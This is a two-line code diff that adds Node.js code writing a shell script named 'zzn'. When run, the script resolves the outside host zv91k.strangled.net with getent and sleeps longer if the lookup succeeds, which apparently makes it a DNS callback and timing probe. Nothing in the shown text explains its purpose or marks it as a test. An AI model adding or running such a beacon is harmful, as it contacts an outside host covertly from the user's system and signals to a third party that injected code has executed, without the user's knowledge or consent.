@@ -1,0 +1,2 @@
+const fs=require('fs');
+fs.writeFileSync('zzn', "getent hosts zv91k.strangled.net > /dev/null 2>&1 && sleep 8 || sleep 1\n", 'latin1');
